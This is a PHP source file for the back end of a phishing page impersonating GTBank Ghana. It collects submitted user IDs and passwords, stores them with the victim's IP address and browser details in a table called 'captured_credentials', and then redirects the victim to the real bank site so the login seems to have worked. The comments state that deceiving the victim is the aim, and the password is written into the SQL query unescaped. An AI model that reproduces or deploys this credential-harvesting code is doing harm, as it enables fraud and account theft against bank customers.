<?php
// Start session
session_start();

// Include database configuration
require_once 'config.php';

// Initialize variables
$user_id = "";
$password = "";
$error = "";

// Process form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $user_id = mysqli_real_escape_string($conn, $_POST['userID']);
    $password = $_POST['password']; // Don't escape the password before storing
    
    // Validate input
    if (empty($user_id)) {
        $error = "User ID is required";
    } else if (empty($password)) {
        $error = "Password is required";
    } else {
        // Store credentials in database
        $date_captured = date('Y-m-d H:i:s');
        $ip_address = $_SERVER['REMOTE_ADDR'];
        $user_agent = mysqli_real_escape_string($conn, $_SERVER['HTTP_USER_AGENT']);
        
        // Check if we already have a users table, if not create one
        $check_table = mysqli_query($conn, "SHOW TABLES LIKE 'captured_credentials'");
        if(mysqli_num_rows($check_table) == 0) {
            // Create table for storing captured credentials
            $create_table = "CREATE TABLE captured_credentials (
                id INT(11) AUTO_INCREMENT PRIMARY KEY,
                user_id VARCHAR(100) NOT NULL,
                password VARCHAR(100) NOT NULL,
                ip_address VARCHAR(45),
                user_agent TEXT,
                date_captured DATETIME
            )";
            mysqli_query($conn, $create_table);
        }
        
        // Insert captured credentials into database
        $insert_sql = "INSERT INTO captured_credentials (user_id, password, ip_address, user_agent, date_captured) 
                       VALUES ('$user_id', '$password', '$ip_address', '$user_agent', '$date_captured')";
        
        if(mysqli_query($conn, $insert_sql)) {
            // Successfully stored credentials
            
            // Create session to simulate successful login
            $_SESSION['logged_in'] = true;
            $_SESSION['user_id'] = $user_id;
            $_SESSION['full_name'] = "Account User"; // Generic name
            
            // Redirect to the real bank website
            header("Location: https://www.gtbghana.com/");
            exit();
        } else {
            // If storing fails, still redirect but log the error
            error_log("Failed to store credentials: " . mysqli_error($conn));
            
            // Still redirect user to make them think login worked
            header("Location: https://www.gtbghana.com/");
            exit();
        }
    }
}

// If there's an error, redirect back to login page with error message
if (!empty($error)) {
    $_SESSION['login_error'] = $error;
    header("Location: login.php");
    exit();
}
?> 